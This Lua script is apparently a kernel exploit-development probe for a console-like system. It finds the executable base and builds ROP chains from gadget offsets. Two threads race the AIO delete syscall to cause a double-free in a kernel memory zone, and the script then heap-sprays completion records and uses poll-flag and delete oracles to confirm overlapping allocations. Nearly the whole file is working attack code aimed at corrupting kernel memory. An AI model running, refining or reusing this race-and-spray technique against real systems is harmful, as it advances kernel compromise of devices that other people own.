-- CRASH_CLASS: MODERATE
-- PROBE 67c: Detect zone-64 overlap via poll-flag cross-contamination
--
-- FIXED: Uses TWO child threads for 662 race (matching 65l's 69% hit rate).
-- Previous versions used child+main which got 0%.
--
-- After double-free creates a freelist cycle in zone-64:
--   free(X) twice → freelist: X → X → old_head
--   next two allocs both return X → two live objects share memory
--
-- Oracle: spray unpolled AIO requests after double-free. Two consecutive
-- completion records (48B, zone-64) may share memory. Poll EVEN indices
-- via 664, then check ODD indices via 663. If an odd shows 0x00010003
-- (polled), it shares a completion record with a polled even → OVERLAP.
--
-- Also detects: crash during sequential delete (freed memory access),
-- and 663 status anomalies on survivors after interleaved delete.

print("=== PROBE 67c: OVERLAP ORACLE (2-child race) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end) end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSEGV, SIGSYS, SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print(string.format("eb=%s", fmt_q(eb)))

local g_pop_rax   = eb + 0x992
local g_pop_rdi   = eb + 0xC9DFE
local g_pop_rsi   = eb + 0xD77D
local g_pop_rdx   = eb + 0x3B02D7
local g_bare_ret  = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf   = memory.alloc(0x4000)
local rbuf   = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(1))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_664(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)), uint64(0), uint64(0))
    end)
    return rd(N(one_st)) or 0xDEAD
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local BATCH = 16

-- =========================================================
-- [A] TWO-CHILD 662 RACE + POLL-FLAG ORACLE
-- Exact same race pattern as confirmed 65l:
-- Two children spawned back-to-back via thr_new(455),
-- both calling 662 on the same ID array.
-- =========================================================
print("")
print("[A] 2-child race + poll-flag oracle")

local del_ids  = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

local TRIALS = 10
local total_doubles = 0
local total_overlaps = 0

for trial = 1, TRIALS do
    if not alive() then
        print(string.format("  trial %d: DEAD", trial))
        break
    end

    -- Submit + poll BATCH victims
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then
            poll_664(id)
            table.insert(ids, id)
        end
    end
    if #ids < BATCH then
        print(string.format("  trial %d: only %d IDs", trial, #ids))
        if #ids == 0 then break end
    end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- ===== Child A: marker → 662 → exit =====
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431))
    emA(stub)

    -- ===== Child B: marker → 662 → exit =====
    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431))
    emB(stub)

    -- thr_param structs
    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    -- ★★★ Spawn BOTH children back-to-back (the race!) ★★★
    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    -- Main thread waits
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    -- Count doubles
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if not alive() then
        print(string.format("  trial %d: dbl=%d DEAD after race", trial, doubles))
        break
    end

    if doubles == 0 then
        if trial <= 3 or trial == TRIALS then
            print(string.format("  trial %d: dbl=0 (no race win)", trial))
        end
    else
        -- ★ SPRAY: submit SPRAY_COUNT unpolled AIO requests
        -- Each allocates a 48B completion record from zone-64.
        -- Two consecutive ones may share the same address.
        local SPRAY_COUNT = 128
        local spray = {}
        for i = 1, SPRAY_COUNT do
            if not alive() then break end
            local id = submit_one()
            if id ~= 0 then table.insert(spray, id) end
        end

        if not alive() then
            print(string.format("  trial %d: dbl=%d spray=%d DEAD during spray",
                trial, doubles, #spray))
            break
        end

        -- ★ ORACLE A: Poll-flag cross-contamination
        -- 1. Query ALL spray via 663 → expect 0x00000003 (unpolled)
        local baseline = {}
        local baseline_bad = 0
        for i = 1, #spray do
            local st = query_663(spray[i])
            baseline[i] = st
            if st ~= 0x00000003 then baseline_bad = baseline_bad + 1 end
        end

        -- 2. Poll EVEN indices only (1-indexed: 2,4,6,...)
        for i = 2, #spray, 2 do
            poll_664(spray[i])
        end

        -- 3. Check ODD indices → 0x00010003 means shared with a polled even
        local overlaps = 0
        for i = 1, #spray, 2 do
            if not alive() then break end
            local st = query_663(spray[i])
            if st == 0x00010003 then
                overlaps = overlaps + 1
                if overlaps <= 5 then
                    print(string.format("    *** OVERLAP: spray[%d] id=%d polled-flag leaked! ***",
                        i, spray[i]))
                end
            end
        end

        -- 4. Check EVEN indices → did any lose the polled flag?
        local even_lost = 0
        for i = 2, #spray, 2 do
            if not alive() then break end
            local st = query_663(spray[i])
            if st ~= 0x00010003 then even_lost = even_lost + 1 end
        end

        total_overlaps = total_overlaps + overlaps

        -- ★ ORACLE B: Sequential delete crash detection
        -- Poll all unpolled spray items first (required for delete)
        for i = 1, #spray, 2 do
            if alive() then poll_664(spray[i]) end
        end

        local del_ok = 0
        local del_err = 0
        local del_crash = false
        local err_codes = {}
        for i = 1, #spray do
            if not alive() then del_crash = true; break end
            local st = delete_one(spray[i])
            if st == 0 then
                del_ok = del_ok + 1
            else
                del_err = del_err + 1
                local code = string.format("0x%08X", st)
                err_codes[code] = (err_codes[code] or 0) + 1
            end
        end

        local ec_str = ""
        for code, cnt in pairs(err_codes) do
            ec_str = ec_str .. string.format(" %s*%d", code, cnt)
        end

        print(string.format(
            "  trial %d: dbl=%d spray=%d base_bad=%d overlap=%d even_lost=%d del=%d/%d%s%s",
            trial, doubles, #spray, baseline_bad, overlaps, even_lost,
            del_ok, del_err, ec_str,
            del_crash and " *** CRASH ***" or ""))
    end
end

if not alive() then
    print("")
    print("=== PROCESS DIED ===")
    print(string.format("  total_doubles=%d total_overlaps=%d", total_doubles, total_overlaps))
    return
end

-- =========================================================
-- [B] INTERLEAVED DELETE: free odds, then check evens via 663
-- If two spray items share a completion record, freeing one
-- corrupts the other. 663 on the survivor may return anomalous status.
-- =========================================================
print("")
print("[B] Interleaved delete oracle")

for trial = 1, 5 do
    if not alive() then break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_664(id); table.insert(ids, id) end
    end
    local count = #ids
    if count < BATCH then
        if count == 0 then break end
    end

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Two-child race (same pattern as section A)
    local stk_A2 = memory.alloc(0x4000)
    local sb_A2 = N(stk_A2)
    local rsp_A2 = sb_A2 + 0x2000 - ((sb_A2 + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A2 + i, 0) end
    local oA2 = 0
    local function emA2(v) wq(rsp_A2 + oA2, v); oA2 = oA2 + 8 end
    emA2(g_pop_rax); emA2(uint64(0x41))
    emA2(g_pop_rdi); emA2(uint64(N(marker_A)))
    emA2(g_mov_m_rax)
    emA2(g_pop_rdi); emA2(uint64(N(del_ids)))
    emA2(g_pop_rsi); emA2(uint64(count))
    emA2(g_pop_rdx); emA2(uint64(N(states_A)))
    emA2(g_pop_rax); emA2(uint64(662))
    emA2(stub)
    emA2(g_pop_rdi); emA2(uint64(0))
    emA2(g_pop_rax); emA2(uint64(431))
    emA2(stub)

    local stk_B2 = memory.alloc(0x4000)
    local sb_B2 = N(stk_B2)
    local rsp_B2 = sb_B2 + 0x2000 - ((sb_B2 + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B2 + i, 0) end
    local oB2 = 0
    local function emB2(v) wq(rsp_B2 + oB2, v); oB2 = oB2 + 8 end
    emB2(g_pop_rax); emB2(uint64(0x42))
    emB2(g_pop_rdi); emB2(uint64(N(marker_B)))
    emB2(g_mov_m_rax)
    emB2(g_pop_rdi); emB2(uint64(N(del_ids)))
    emB2(g_pop_rsi); emB2(uint64(count))
    emB2(g_pop_rdx); emB2(uint64(N(states_B)))
    emB2(g_pop_rax); emB2(uint64(662))
    emB2(stub)
    emB2(g_pop_rdi); emB2(uint64(0))
    emB2(g_pop_rax); emB2(uint64(431))
    emB2(stub)

    local p2A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(p2A) + i, 0) end
    wq(N(p2A), g_bare_ret)
    wq(N(p2A) + 0x10, uint64(sb_A2))
    wq(N(p2A) + 0x18, uint64(0x2000))
    local t2A = memory.alloc(8); wq(N(t2A), uint64(0))
    wq(N(p2A) + 0x30, t2A)

    local p2B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(p2B) + i, 0) end
    wq(N(p2B), g_bare_ret)
    wq(N(p2B) + 0x10, uint64(sb_B2))
    wq(N(p2B) + 0x18, uint64(0x2000))
    local t2B = memory.alloc(8); wq(N(t2B), uint64(0))
    wq(N(p2B) + 0x30, t2B)

    -- ★★★ Two children race ★★★
    pcall(function() mk(455)(p2A, uint64(0x38)) end)
    pcall(function() mk(455)(p2B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(N(dbuf)) end

    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end

    if not alive() then
        print(string.format("  B-trial %d: dbl=%d DEAD", trial, doubles))
        break
    end

    if doubles == 0 then
        print(string.format("  B-trial %d: dbl=0", trial))
    else
        -- Spray AIO (all polled for later delete)
        local spray = {}
        for i = 1, 128 do
            if not alive() then break end
            local id = submit_one()
            if id ~= 0 then poll_664(id); table.insert(spray, id) end
        end

        if not alive() then
            print(string.format("  B-trial %d: dbl=%d DEAD during spray", trial, doubles))
            break
        end

        -- Delete ODD indices first
        local odd_ok = 0
        for i = 1, #spray, 2 do
            if not alive() then break end
            local st = delete_one(spray[i])
            if st == 0 then odd_ok = odd_ok + 1 end
        end

        if not alive() then
            print(string.format("  B-trial %d: dbl=%d DEAD during odd delete", trial, doubles))
            break
        end

        -- Check EVEN indices via 663 before deleting
        -- If shared memory was corrupted, status may differ from 0x00010003
        local anomalies = 0
        for i = 2, #spray, 2 do
            if not alive() then break end
            local st = query_663(spray[i])
            if st ~= 0x00010003 then
                anomalies = anomalies + 1
                if anomalies <= 5 then
                    print(string.format("    *** ANOMALY: spray[%d] id=%d st=0x%08X (expected 0x00010003) ***",
                        i, spray[i], st))
                end
            end
        end

        -- Delete EVEN indices
        local even_ok = 0
        local even_crash = false
        for i = 2, #spray, 2 do
            if not alive() then even_crash = true; break end
            local st = delete_one(spray[i])
            if st == 0 then even_ok = even_ok + 1 end
        end

        print(string.format(
            "  B-trial %d: dbl=%d spray=%d odd_ok=%d anomalies=%d even_ok=%d%s",
            trial, doubles, #spray, odd_ok, anomalies, even_ok,
            even_crash and " *** EVEN CRASH ***" or ""))
    end
end

-- =========================================================
-- [C] SUMMARY
-- =========================================================
print("")
print("[SUMMARY]")
print(string.format("  total_doubles=%d total_overlaps=%d alive=%s",
    total_doubles, total_overlaps, alive() and "YES" or "NO"))
if total_overlaps > 0 then
    print("  *** POLL-FLAG CROSS-CONTAMINATION CONFIRMED ***")
    print("  Two AIO completion records share memory after double-free!")
end
print("")
print("=== PROBE 67c COMPLETE ===")
